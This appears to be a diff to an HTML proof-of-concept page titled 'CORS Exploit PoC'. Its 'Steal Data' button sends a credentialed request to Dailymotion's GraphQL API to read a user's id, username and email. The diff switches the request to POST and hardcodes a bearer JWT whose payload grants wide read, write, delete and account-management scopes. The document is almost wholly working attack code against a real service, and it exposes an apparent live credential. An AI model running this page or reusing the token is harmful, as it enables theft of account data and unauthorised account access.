@@ -4,15 +4,24 @@
 <h2>CORS Exploit PoC</h2>
 <button onclick="steal()">Steal Data</button>
 
+<pre id="out"></pre>
+
 <script>
 function steal() {
   fetch("https://graphql.api.dailymotion.com", {
-    method: "GET",
-    credentials: "include"
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhaWQiOiIwZDJkODI2NDA5YWY5ZTcyZGI1ZCIsInJvbCI6ImNhbi1yZWFkLW15LXZpZGVvLXN0cmVhbXMgY2FuLW1hbmFnZS1jbGFpbS1ydWxlcyBjYW4tcmVhZC1jbGFpbS1ydWxlcyBjYW4tc3Bvb2YtY291bnRyeSBhbGxzY29wZXMgY2FuLXJlYWQtdmlkZW8tc3RyZWFtcyBhY2NvdW50LWNyZWF0b3IiLCJzY28iOiJyZWFkIHdyaXRlIGRlbGV0ZSBlbWFpbCB1c2VyaW5mbyBmZWVkIG1hbmFnZV92aWRlb3MgbWFuYWdlX2NvbW1lbnRzIG1hbmFnZV9wbGF5bGlzdHMgbWFuYWdlX3RpbGVzIG1hbmFnZV9zdWJzY3JpcHRpb25zIG1hbmFnZV9mcmllbmRzIG1hbmFnZV9mYXZvcml0ZXMgbWFuYWdlX2xpa2VzIG1hbmFnZV9ncm91cHMgbWFuYWdlX3JlY29yZHMgbWFuYWdlX3N1YnRpdGxlcyBtYW5hZ2VfZmVhdHVyZXMgbWFuYWdlX2hpc3RvcnkgaWZ0dHQgcmVhZF9pbnNpZ2h0cyBtYW5hZ2VfY2xhaW1fcnVsZXMgZGVsZWdhdGVfYWNjb3VudF9tYW5hZ2VtZW50IG1hbmFnZV9hbmFseXRpY3MgbWFuYWdlX3BsYXllciBtYW5hZ2VfcGxheWVycyBtYW5hZ2VfdXNlcl9zZXR0aW5ncyBtYW5hZ2VfY29sbGVjdGlvbnMgbWFuYWdlX2FwcF9jb25uZWN0aW9ucyBtYW5hZ2VfYXBwbGljYXRpb25zIG1hbmFnZV9kb21haW5zIG1hbmFnZV9wb2RjYXN0cyIsImx0byI6Ik5ucGJUUVJjUlU5X1d3eE9CbWRmZEhvX1VBbFdUSHR6UFZBZlJBIiwiYWluIjoxLCJhZGciOjEsImlhdCI6MTc2NjYwMTUzOSwiZXhwIjoxNzY2NjM3MjU0LCJkbXYiOiIxIiwiYXRwIjoibmF0aXZlX2FwcCIsInZpZCI6IjU2RUFFMjVCLTMxQzEtNDJDNi05RUQ3LUE4NDZBOThEREUxRCIsImZ0cyI6NzQwOTczLCJjYWQiOjIsImN4cCI6MiwiY2F1IjoyLCJraWQiOiJBRjg0OURENzNBNTg2M0NEN0Q5N0QwQkFCMDcyMjQzQiJ9.7RB2WNZ5Fjxxah59voqhckGW0oFFhDGgcB92U_0c07s"
+    },
+    body: JSON.stringify({
+      query: "{ me { id username email } }"
+    })
   })
   .then(res => res.text())
   .then(data => {
-    document.body.innerHTML += "<pre>" + data + "</pre>";
+    document.getElementById("out").textContent = data;
   });
 }
 </script>
